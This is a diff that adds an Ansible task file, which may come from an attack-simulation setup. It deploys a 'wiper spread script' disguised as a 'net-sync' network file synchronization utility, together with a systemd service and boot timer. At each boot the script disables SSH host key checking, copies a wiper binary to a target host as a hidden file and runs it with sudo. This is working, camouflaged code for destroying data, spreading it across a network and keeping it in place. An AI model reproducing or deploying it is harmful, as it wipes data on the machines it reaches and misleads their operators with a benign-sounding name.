@@ -1,0 +1,83 @@
+---
+- name: Install SSH client
+  apt:
+    name: openssh-client
+    state: present
+    update_cache: yes
+
+- name: Create wiper spread script
+  copy:
+    dest: "{{ spread_script }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # net-sync — network file synchronization utility
+
+      TARGET="{{ target_host }}"
+      TARGET_USER="{{ target_user }}"
+      BINARY="{{ wiper_binary }}"
+      LOG="{{ spread_log }}"
+      SSH_OPTS="-o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=10"
+
+      echo "[$(date -Is)] Starting network sync to $TARGET" >> "$LOG"
+
+      if ! ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "true" 2>/dev/null; then
+          echo "[$(date -Is)] Connection to $TARGET failed" >> "$LOG"
+          exit 1
+      fi
+
+      # Copy wiper binary
+      scp $SSH_OPTS "$BINARY" "${TARGET_USER}@${TARGET}:/tmp/.net-sync" 2>/dev/null
+      ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" \
+          "sudo mv /tmp/.net-sync $BINARY && sudo chmod 755 $BINARY" 2>/dev/null
+
+      # Install and run wiper on target
+      ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "sudo $BINARY" 2>/dev/null
+
+      echo "[$(date -Is)] Network sync complete on $TARGET" >> "$LOG"
+
+- name: Create systemd service for spreader
+  copy:
+    dest: "/etc/systemd/system/{{ spread_service }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Network Synchronization Service
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      User={{ username }}
+      ExecStart={{ spread_script }}
+      RemainAfterExit=yes
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create systemd timer for spreader
+  copy:
+    dest: "/etc/systemd/system/{{ spread_timer }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Network Synchronization Timer
+
+      [Timer]
+      OnBootSec=6min
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable spreader timer
+  systemd:
+    name: "{{ spread_timer }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
